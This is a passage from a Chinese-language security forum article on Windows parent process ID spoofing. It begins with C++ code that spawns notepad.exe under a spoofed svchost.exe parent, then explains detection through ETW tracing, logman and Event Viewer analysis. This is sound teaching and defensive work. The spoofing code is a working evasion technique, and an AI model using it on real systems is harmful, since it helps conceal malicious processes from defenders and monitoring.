    if (pTokenIL)
    {
        LocalFree(pTokenIL);
        pTokenIL = NULL;
        cbTokenIL = 0;
    }

    if (ERROR_SUCCESS != dwError)
    {
        // 失败时确保此能够获取此错误代码
        SetLastError(dwError);
        return L"ERROR";
    }
    else
    {
        if (*pdwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
            return L"LOW";
        }
        else if (*pdwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && *pdwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
            return L"MEDIUM";
        }
        else if (*pdwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
            return L"HIGH";
        }
        else if (*pdwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
            return L"SYSTEM";
        }
    }
}

DWORD getPPID(LPCWSTR processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);
    bool flag = false;

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, processName)) {
                HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, process.th32ProcessID);
                if (hProcess) {
                    LPCWSTR integrityLevel = NULL;
                    DWORD dwIntegrityLevel;
                    integrityLevel = getProcessIntegrityLevel(hProcess, &dwIntegrityLevel);
                    if (!wcscmp(integrityLevel, L"ERROR")) {
                        cout << "[!] PID = " << process.th32ProcessID << " GetProcessIntegrityLevel failed, Error: " << get_last_error(GetLastError()) << endl;
                        continue;
                    }
                    if (!wcscmp(integrityLevel, L"MEDIUM")) {
                        flag = true;
                        break;
                    }
                }
            }
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    // 没有找到 MEDIUM 权限的进程
    if (!flag) {
        cout << processName << " does have medium integrity level!!" << endl;
        exit(-1);
    }
    return process.th32ProcessID;
}

int main() {
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));

    LPCWSTR parentProcess = L"svchost.exe";
    DWORD parentPID = getPPID(parentProcess);
    printf("[+] Spoofing %ws (PID: %u) as the parent process.\n", parentProcess, parentPID);
    HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, parentPID);

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    LPCWSTR spawnProcess = L"C:\\Windows\\System32\\notepad.exe";
    CreateProcess(spawnProcess, NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (STARTUPINFO*)&si, &pi);
    printf("[+] Spawning %ws (PID: %u)\n", spawnProcess, pi.dwProcessId);

    return 0;
}
```

再次运行，可以看到，程序一开始尝试了pid 为 3868 的 svchost.exe，但是没有成功，提示“**拒绝访问**”，说明权限不够。然后尝试了 5964，成功了，在 Process Hacker 下也看到 notepad.exe 在 svchost.exe 了。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-d9e87caefaf6c1b8a1211d3cba0250d703491281.png)

0x04 检测
-------

> 检测方法来源：<https://blog.f-secure.com/detecting-parent-pid-spoofing/>

上面我们展示了如何进行 ppid 欺骗，如果你是蓝队的小伙伴，在受害主机上用任务管理器或者进程管理器之类的工具查看正在运行的进程，只能看到欺骗后的 ID，那有没有啥办法可以找出真实的 ID 呢？这里就需要用到 [ETW（Event Tracing for Windows）](https://docs.microsoft.com/en-us/dotnet/framework/wcf/samples/etw-tracing)了，它是 Windows 提供的原生的事件跟踪日志系统，说人话就是，ETW 就是用来记录 Windows 系统日志的一个机制。

### 1. ETW 概念

在开始使用之前，我们先来了解一下 ETW 相关的一些基本概念：

> 这块可以去看 <https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101> ，我这里会摘取文章的部分内容。

- `Providers（提供程序）`：可以产生事件日志的程序；
- `Consumers`：订阅和监听 Providers 发出的事件的程序（这个本文用不到）；
- `Keywords（关键字）`：Providers 提供给 Consumer 的事件类型；
- `Tracing session（跟踪会话）`：记录来自一个或多个 Providers 的事件；
- `Contollers`：可以启动 Tracing session 的程序。

### 2. 选择 Providers

了解完基本概念之后，然后根据官方文档 [ETW（Event Tracing for Windows）](https://docs.microsoft.com/en-us/dotnet/framework/wcf/samples/etw-tracing) 的提示，我们可以用 Windows 自带的工具 [Logman.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/logman-start-stop) 启动 [跟踪会话](https://docs.microsoft.com/en-us/windows/win32/etw/event-tracing-sessions)。

> 这里的 `Logman.exe`对应着上面的`Controllers`角色。

首先列出有哪些 Providers

```bash
logman query providers
```

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-90c0f33178334dfe3614ba8f402d908c586b394b.png)

这里我们的 ppid 欺骗跟进程有关，所以这里只需要关注`Microsoft-Windows-Kernel-Process` 这个 providers 。可以查一下这个 Providers 更多的信息。

```bash
# 通过 provider 名字查询
logman query providers Microsoft-Windows-Kernel-Process
# 通过 GUID 查询
logman query providers "{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}"
```

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-3af72be14bbfc2e05f0c6330527a062d7ea8dd6b.png)

可以看到，这个 Providers 有一些 Keywords（关键字），代表这个 Providers 可以提供一些进程、线程等事件。对我们的 PPID欺骗来说，只要看进程就行，所以这里选择的关键字是`WINEVENT_KEYWORD_PROCESS`，对应值为`0x10`

> 题外话，如果我们想要 `WINEVENT_KEYWORD_PROCESS` 和 `WINEVENT_KEYWORD_THREAD` 怎么办？把它们两的值加起来就行，即（0x10+0x20=`0x30`)

### 3. 创建跟踪会话并指定 Provider

在选定了 Providers 之后，我们需要启动 Tracing session（跟踪会话）了，这里我们给会话起一个名字，叫`ppid-spoofing`，同时指定 Providers 是`Microsoft-Windows-Kernel-Process`，Keywords 是`0x10`，如下：

```bash
logman create trace ppid-spoofing -p Microsoft-Windows-Kernel-Process 0x10 -ets
```

然后可以查一下这个跟踪会话的内容，确保它在运行。

```bash
logman query ppid-spoofing -ets
```

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-b6bf1bdcc7b31209419bafde2838515f00e6d214.png)

可以看到它正在运行了，同时结果会输出到`C:\ppid-spoofing.etl`

### 4. 分析日志

然后我们用记事本打开桌面上的`新建文本文档.txt`，关掉，然后再运行 ppid欺骗的代码，启动记事本。这一步是为了找出两者在日志中的不同。

> 这玩意加载有点慢。。。最好我们可以再等会。。。等待期间可以随便的打开关闭一些程序。

过一会查看`C:\ppid-spoofing.etl`，发现里面已经有了内容

> 经过我实测，文件大小最好是大于8kb才有数据

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-5514b5d44e77180c6c29523725ad0e193a8bd9fc.png)

然后打开`Event Viewer（事件查看器）`-&gt;打开保存的日志

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-39171f7c0882b0404ba8a91d819082a45356e21c.png)

**下图这里一定要选“否”**，不然。。。自己测就知道了。。都是泪。。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-1e8ad5c3b784aa673fe03413d8e7af144073942c.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-82c4c160604800de375e010f1272ff42b8442437.png)

然后开始找一下日志，首先找到了，我们直接在桌面打开的记事本的日志。可以看到，`Execution`下的`ProcessID`和`Data`下的`ParentProcessID`是一致的。

> 如果没有日志，可以 事件查看器左边栏 -&gt; 保存的日志 -&gt; ppid-spoofing -&gt; 右键 -&gt; 删除，然后把事件查看器关了，按照上面的操作重新打开。不行就再等等。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-a03853da5b7cb21a50525e7af7f02553b97d672a.png)

然后找到了启动了我们的 ppid 欺骗程序的启动日志，注意，`ppid_spoofing.exe`的 `ProcessID` 是`4632`

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-96dfb9af57d6b100aa3ab5e99c840808527e72ed.png)

然后就是欺骗后的记事本了，可以看到，在`Data`下的`ParentProcessID`是我们在代码指定的 svchost.exe 的PID ，真正的 `ParentProcessID` 应该是`Execution`下的`ProcessID`，这里是`4632`，正好对应着上面的`ppid_spoofing.exe`的 `ProcessID` 。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-abd990d41985d2b2e539da235d965992746788b7.png)

因此得出结论，`Execution`下的`ProcessID`和`Data`下的`ParentProcessID`的值要一致，否则**可能**是 PPID 欺骗，而且真正的 PPID 应该以`Execution`下的`ProcessID`为准。

为啥说是**可能**呢？<https://blog.f-secure.com/detecting-parent-pid-spoofing/> 这文章中提到，UAC 会欺骗父进程。当 UAC 执行时，实际上是通过 svchost.exe 启动权限提升的进程，启动之后，会把该进程的父进程改成原始调用者。

举个例子，比如我们用管理员权限打开 cmd 的时候，在弹出UAC框之前，cmd 的父进程是 explorer.exe，弹出 UAC 框，问我们要不要用管理员权限的打开，如果我们点了ok之后，svchost.exe 就会启动管理员权限的 cmd.exe ，然后把 cmd.exe 的父进程改成原来的调用者 --- explorer.exe。测试如下图：

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-39330aeca5aca322f41e9baae9a05dc756def5f2.png)

### 5. 终止跟踪会话

分析完后，直接执行如下命令，把跟踪会话关掉即可。

```bash
logman stop ppid-spoofing -ets
```

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-7a55cef51f0f1271a63eac36a08a0997c5449860.png)

### 6. 最终效果

分析了这么多PPID欺骗该如何检测，现在看看效果。

去 <https://github.com/countercept/ppid-spoofing/blob/master/detect-ppid-spoof.py> 拿到大佬写好的检测脚本，直接管理员打开 powershell，然后执行 python 脚本开始监听。然后执行 ppid 欺骗，过一会，就看到 python 脚本提示 notepad.exe 有问题了。

> 先后顺序不能错，是先开启监听日志，然后再发起的攻击。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-1d9c115bd2c83260c0ffd853c35b9068d89473be.png)

检测代码也很简单，和刚刚分析的思路一致，即`Execution`下的`ProcessID`和`Data`下的`ParentProcessID`如果不一致，说明可能是PPID欺骗，再排除 UAC 即可。如果是 UAC 的话，会有个服务名字叫`appinfo`，代码中就是根据这个判断是不是 UAC的。

> 实际上不仅仅只有 UAC 会发生PPID欺骗，别的程序也有，这个检测脚本仅仅排除了UAC而已。

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-f84ae364c8459a66028901adc4537819fa3f6731.png)

0x05 工具
-------

这里列出别人写好的程序。

### 利用工具

在 <https://xz.aliyun.com/t/8387> 这里， Al1ex 师傅列了一大堆，我就不献丑了，自取。

### 检测工具

- Python：<https://github.com/countercept/ppid-spoofing/blob/master/detect-ppid-spoof.py>
- C#：<https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing>

0x06 参考
-------

<https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing>

<https://captmeelo.com/redteam/maldev/2021/11/22/picky-ppid-spoofing.html>

<https://blog.f-secure.com/detecting-parent-pid-spoofing/>

0x07 后言
-------

听过 PPID Spoofing 和 APC 注入更配哦，有机会试试！！

最后感谢大家的阅读，笔者学疏才浅，若有差错，恳请各位斧正。

**都看到这里了，不管你是直接拉到底的，还是看到底的，要不辛苦一下，给点个推荐呗？**